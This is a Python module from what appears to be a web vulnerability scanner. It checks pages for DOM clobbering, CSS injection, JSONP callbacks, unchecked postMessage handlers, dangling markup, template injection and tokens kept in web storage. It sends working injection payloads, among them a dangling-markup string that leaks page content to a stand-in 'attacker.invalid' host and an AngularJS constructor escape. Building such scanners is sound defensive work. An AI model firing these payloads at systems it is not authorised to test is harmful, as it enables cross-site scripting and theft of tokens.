"""Client-side scanners: DOM clobbering, CSS injection, postMessage, JSONP, dangling markup, CSTI, web storage leaks."""
import re, httpx
from typing import Optional
from mantis.core.findings import Finding, Severity, EvidenceLevel, FindingSource


async def scan_dom_clobbering(http, url):
    """Heuristic detection of DOM clobbering vectors."""
    try:
        r = await http.get(url, timeout=10)
        body = r.text
        risky = [
            r"document\.getElementById\(['\"]\w+['\"]\)",
            r"window\.\w+\s*\|\|",
            r"document\.forms\[",
        ]
        hits = sum(1 for p in risky if re.search(p, body))
        if hits >= 2 and "<script" in body:
            return Finding(
                title=f"Potential DOM Clobbering at {url}",
                description="Page uses patterns clobberable via HTML injection.",
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.SUSPICION,
                target=url, endpoint=url, vuln_type="DOM Clobbering",
                cwe="CWE-79", confidence=0.4, tags=["dom_clobbering"],
                impact="Override JS variables via HTML injection, bypass security logic.",
                remediation="Verify property types. Avoid named-element access.",
            )
    except Exception: pass
    return None


async def scan_css_injection(http, url, param):
    """CSS injection — data exfil via attribute selectors."""
    payload = "</style><style>body{background:url(//mantis-css-test.invalid)}"
    try:
        r = await http.get(url, params={param: payload}, timeout=10)
        if "mantis-css-test.invalid" in r.text and "<style>" in r.text:
            return Finding(
                title=f"CSS Injection in '{param}'",
                description="User input reflected inside <style> context.",
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=url, endpoint=url, vuln_type="CSS Injection",
                cwe="CWE-79", payload=payload, confidence=0.7, tags=["css_injection"],
                impact="Data exfiltration via CSS attribute selectors, UI manipulation.",
                remediation="Encode input before placing in style contexts. CSP.",
            )
    except Exception: pass
    return None


async def scan_jsonp_hijacking(http, url):
    """JSONP endpoints with arbitrary callback parameter."""
    for cb in ["callback", "jsonp", "cb", "json_callback"]:
        try:
            r = await http.get(url, params={cb: "mantisCB"}, timeout=10)
            ct = r.headers.get("content-type", "").lower()
            if ("javascript" in ct or "application/x-javascript" in ct) and r.text.strip().startswith("mantisCB"):
                return Finding(
                    title=f"JSONP Endpoint Allows Arbitrary Callback at {url}",
                    description=f"'{cb}' parameter is reflected as JS function name.",
                    source=FindingSource.WEBAPP, severity=Severity.HIGH,
                    evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                    target=url, endpoint=url, vuln_type="JSONP Hijacking",
                    cwe="CWE-352", payload=f"{cb}=mantisCB", confidence=0.85, tags=["jsonp"],
                    impact="Steal cross-origin authenticated data.",
                    remediation="Whitelist callback names or use CORS instead.",
                )
        except Exception: continue
    return None


async def scan_postmessage(http, url):
    """postMessage handler without origin check."""
    try:
        r = await http.get(url, timeout=10)
        body = r.text
        if "addEventListener" in body and "message" in body:
            has_origin = bool(re.search(r"\.origin\s*[!=]==?\s*['\"]", body) or "checkOrigin" in body)
            uses_data = bool(re.search(r"\.data\.\w+|\.data\[", body))
            if uses_data and not has_origin:
                return Finding(
                    title=f"postMessage Handler Without Origin Validation at {url}",
                    description="JavaScript processes event.data without checking event.origin.",
                    source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                    evidence_level=EvidenceLevel.STATIC_CORROBORATION,
                    target=url, endpoint=url, vuln_type="postMessage",
                    cwe="CWE-940", confidence=0.6, tags=["postmessage"],
                    impact="Cross-origin attackers can send malicious messages → DOM XSS or logic bypass.",
                    remediation="Verify event.origin against allowlist.",
                )
    except Exception: pass
    return None


async def scan_dangling_markup(http, url, param):
    """Dangling markup — partial HTML injection for data exfiltration."""
    payload = "><img src='//attacker.invalid?leak="
    try:
        r = await http.get(url, params={param: payload}, timeout=10)
        if payload in r.text or "src='//attacker.invalid" in r.text:
            return Finding(
                title=f"Dangling Markup Injection in '{param}'",
                description="Partial HTML injection allows data exfiltration via unclosed attribute.",
                source=FindingSource.WEBAPP, severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=url, endpoint=url, vuln_type="Dangling Markup",
                cwe="CWE-79", payload=payload, confidence=0.8, tags=["dangling_markup"],
                impact="Exfiltrate CSRF tokens or page content even when full XSS is blocked.",
                remediation="HTML-encode all output. Strict CSP.",
            )
    except Exception: pass
    return None


async def scan_csti(http, url, param):
    """Client-side template injection (AngularJS/Vue)."""
    payload = "{{constructor.constructor('return 7*7')()}}"
    try:
        r = await http.get(url, params={param: payload}, timeout=10)
        is_ng = "ng-app" in r.text or "ng-controller" in r.text
        is_vue = "v-bind" in r.text or "v-if" in r.text
        if (is_ng or is_vue) and ("49" in r.text or payload in r.text):
            return Finding(
                title=f"Client-Side Template Injection in '{param}'",
                description=f"Input reflected into {'AngularJS' if is_ng else 'Vue'} template context.",
                source=FindingSource.WEBAPP, severity=Severity.HIGH,
                evidence_level=EvidenceLevel.DYNAMIC_CONFIRMED,
                target=url, endpoint=url, vuln_type="Client-Side Template Injection",
                cwe="CWE-1336", payload=payload, confidence=0.8, tags=["csti", "xss"],
                impact="Bypass XSS filters via client-side template expressions.",
                remediation="Don't reflect input into template contexts. Use ng-bind/v-text instead of interpolation.",
            )
    except Exception: pass
    return None


async def scan_web_storage_leak(http, url):
    """Sensitive data in localStorage/sessionStorage."""
    try:
        r = await http.get(url, timeout=10)
        risky = re.findall(
            r'(?:localStorage|sessionStorage)\.setItem\(["\'](\w*(?:token|password|secret|key|auth|jwt|session)\w*)["\']',
            r.text, re.I
        )
        if risky:
            return Finding(
                title=f"Sensitive Data in Web Storage at {url}",
                description=f"Page writes sensitive keys to web storage: {', '.join(set(risky))}.",
                source=FindingSource.WEBAPP, severity=Severity.MEDIUM,
                evidence_level=EvidenceLevel.STATIC_CORROBORATION,
                target=url, endpoint=url, vuln_type="Sensitive Data Exposure",
                cwe="CWE-922", confidence=0.7, tags=["web_storage"],
                impact="XSS can steal tokens from localStorage. Tokens persist across sessions.",
                remediation="Store auth tokens in httpOnly cookies, not web storage.",
            )
    except Exception: pass
    return None
